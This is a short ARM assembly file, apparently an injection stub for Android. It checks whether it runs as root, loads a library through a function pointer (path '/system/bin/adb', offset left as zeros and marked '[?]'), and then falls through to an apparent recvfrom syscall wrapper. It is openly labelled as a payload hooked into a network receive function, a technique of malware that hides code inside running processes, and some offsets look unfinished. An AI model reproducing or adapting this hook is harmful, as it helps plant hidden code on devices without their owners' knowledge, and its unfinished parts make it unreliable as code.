.section .text
.global _start
_start:
    .code 32
//----------------check if have root-----------------------------
    push   {r0-r7, lr}
    mov    r12, r7
    mov    r7,  #0xC7
    svc    0
    mov    r7, r12
    cmp    r0, #0
    beq    dlopen
    pop    {r0-r7, lr}
    b      org_fun
//-----------------------payload----------------------------------
 dlopen:
    mov    r0, pc
    add    r0, #0x48
    mov    r1, #0
    sub    r3, r3, r3
    add    r3, r3, pc
    add    r3, #0x48     //offset of /system/bin/adb[?]
    ldr    r3, [r3]
    add    r3, pc, r3
    blx    r3
    pop    {r0-r7, lr}
//-----------------------recvfrome-------------------------------
org_fun:
    mov    r12, sp
    stmfd  sp!, {r4-r7}
    ldmia  r12, {r4-r6}
    mov    r7, #0x124
    svc    0
    ldmfd  sp!, {r4-r7}
    cmn    r0,  #0x1000
    bxls   lr
    rsb    r0, r0, #0
    b      org_fun              //-----j__set_errno.
.ascii "/system/bin/adb\x0"
.ascii "\x0\x0\x0\x0"//------------------dlopen offset-------------
